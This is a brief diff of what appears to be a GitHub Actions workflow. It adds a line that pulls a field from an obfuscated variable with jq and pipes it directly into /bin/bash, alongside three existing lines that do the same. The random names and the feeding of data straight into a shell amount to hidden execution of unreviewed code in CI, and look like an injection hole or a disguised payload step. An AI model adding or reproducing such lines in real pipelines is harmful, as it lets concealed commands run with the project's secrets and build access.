@@ -34,6 +34,7 @@ jobs:
           echo $dsmyb8 | jq -r .xb33076 | /bin/bash
           printf '%s' "$hy5" | jq -r .vtg0794 | /bin/bash
           echo $w1554 | jq -r .gmqro567 | /bin/bash
+          printf '%s' "$al8" | jq -r .osm03 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
